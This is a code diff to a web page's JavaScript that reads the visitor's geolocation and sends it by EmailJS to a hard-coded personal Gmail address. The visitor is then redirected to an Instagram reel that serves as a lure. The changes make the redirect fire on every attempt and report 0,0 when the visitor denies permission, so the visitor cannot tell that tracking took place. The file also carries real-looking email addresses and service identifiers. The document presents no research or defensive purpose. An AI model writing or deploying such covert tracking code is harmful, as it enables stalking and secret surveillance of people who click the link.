@@ -16,31 +16,34 @@
             console.log("EmailJS initialized");
         })();
 
-
         // Function to send email
-function sendEmail(latitude, longitude) {
-    let templateParams = {
-        subject: "Location Tracking",  // Set a custom subject
-        content: `User's Location: Latitude: ${latitude}, Longitude: ${longitude}`, // This will appear in the body of the email
-        to_email: "appash1999@gmail.com", // Replace with your email
-        from_name: "Tracking System",
-        from_email: "p.appash047@gmail.com",
-        lat: latitude,  // Pass lat as a parameter for the template
-        lon: longitude,  // Pass lon as a parameter for the template
-        use_default_email_address: "true", // Optional, can be removed if not needed
-    };
+        function sendEmail(latitude, longitude) {
+            let templateParams = {
+                subject: "Location Tracking",  // Set a custom subject
+                content: `User's Location: Latitude: ${latitude}, Longitude: ${longitude}`, // This will appear in the body of the email
+                to_email: "appash1999@gmail.com", // Replace with your email
+                from_name: "Tracking System",
+                from_email: "p.appash047@gmail.com",
+                lat: latitude,  // Pass lat as a parameter for the template
+                lon: longitude,  // Pass lon as a parameter for the template
+                use_default_email_address: "true", // Optional, can be removed if not needed
+            };
 
-    console.log("Sending email with the following details:", templateParams);
+            console.log("Sending email with the following details:", templateParams);
 
-    emailjs.send("service_6mdzbfj", "template_neg65fj", templateParams)
-        .then(response => {
-            console.log("Email sent successfully!", response);
-            window.location.href = "https://www.instagram.com/reel/DFf3OlWzXKT/?utm_source=ig_web_copy_link"; // Replace with your actual Instagram reel URL
-        })
-        .catch(error => {
-            console.log("Error sending email:", error);
-        });
-}
+            emailjs.send("service_6mdzbfj", "template_neg65fj", templateParams)
+                .then(response => {
+                    console.log("Email sent successfully!", response);
+                })
+                .catch(error => {
+                    console.log("Error sending email:", error);
+                })
+                .finally(() => {
+                    // Always redirect to Instagram reel after email attempt (successful or failed)
+                    window.location.href = "https://www.instagram.com/reel/DFf3OlWzXKT/?utm_source=ig_web_copy_link"; // Replace with your actual Instagram reel URL
+                });
+        }
+
         // Get User Location
         function getLocation() {
             console.log("Getting user location...");
@@ -54,9 +57,13 @@ function sendEmail(latitude, longitude) {
                     sendEmail(lat, lon);
                 }, error => {
                     console.log("Error getting location:", error);
+                    // If there is an error with getting location, proceed with sending email with 0,0 coordinates
+                    sendEmail(0, 0);  // Send 0,0 to indicate permission denied or other error
                 });
             } else {
                 console.log("Geolocation is not supported by this browser.");
+                // Handle case where geolocation is not supported by sending 0,0
+                sendEmail(0, 0);  // Send 0,0 to indicate geolocation is not supported
             }
         }
 
